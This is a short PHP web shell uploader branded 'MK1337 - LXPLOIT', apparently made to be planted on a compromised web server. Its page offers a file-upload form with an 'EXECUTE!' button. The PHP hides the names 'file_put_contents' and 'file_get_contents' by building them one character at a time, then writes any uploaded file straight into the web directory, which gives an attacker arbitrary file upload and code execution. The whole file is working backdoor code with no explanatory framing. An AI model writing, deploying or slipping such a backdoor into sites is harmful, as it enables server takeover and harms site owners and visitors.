<head>
<title>MK1337 UPLOADER - LXPLOIT</title>
</head>
<body>
<center>
<img src="https://media2.giphy.com/media/ShPv5tt0EM396/giphy.gif">
<h1>MK1337 - LXPLOIT</h1>

<form method="post" enctype="multipart/form-data"><input type="file" name="mk1337"><button>EXECUTE!</button></form>
<?php
echo base64_decode("TUsxMzM3");
$LXPLOIT = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$b = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$c = "t"."m"."p"."_"."n"."a"."m"."e";
if (isset($_FILES['mk1337'])) {$LXPLOIT($_FILES['mk1337']['name'], $b($_FILES['mk1337'][$c]));if (file_exists("./".$_FILES['mk1337']['name'])) {echo " Done !";} else {echo " Fail !";}}
?>

